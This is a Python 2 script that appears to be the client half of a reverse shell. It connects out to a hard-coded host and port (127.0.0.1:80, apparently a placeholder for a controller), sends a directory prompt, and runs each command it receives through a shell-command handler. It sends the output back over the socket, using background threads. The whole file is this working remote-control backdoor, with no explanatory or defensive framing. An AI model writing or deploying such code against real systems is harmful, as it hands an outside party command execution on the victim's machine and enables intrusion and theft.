import sys
import socket
import subprocess
import Queue
import os
import threading
import time
import shell_commands

marker = chr(255)

def connect():
    global comm_socket
    comm_socket = socket.socket()
    comm_socket.connect(("127.0.0.1", 80))
    comm_socket.sendall("\n"+os.getcwd()+">"+marker)

try:
    connect()
except socket.error:
    sys.exit("Can't connect to host!")
output_queue = Queue.Queue()

class MessageHandler:
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix
		self.input_queue = Queue.Queue()
		
	def put(self, data):
		self.input_queue.put(data)
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker)
		
	def run(self):
		pass
		
class UserInputHandler(MessageHandler):

	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			
			output = shell_commands.handle_command(data)
			output += "\n"+os.getcwd()+">"
			self.send(output)
		
handlers = []
user_input_handler = UserInputHandler(chr(1))
handlers.append(user_input_handler)

t = threading.Thread(target=user_input_handler.run)
t.daemon = True
t.start()

def data_sender():
	while True:
		comm_socket.sendall(output_queue.get())
				
t = threading.Thread(target=data_sender)
t.daemon = True
t.start()

while True:
	data = ""
	while not data.endswith(marker):
		data += comm_socket.recv(4096)
	if not data: break
	data = data[:-1]
	print "GOT DATA!!"
	
	if data.startswith(chr(1)):
		print "FOR USER INPUT!!"
		user_input_handler.put(data[1:])
		
	elif data.startswith(chr(9)):
		pass
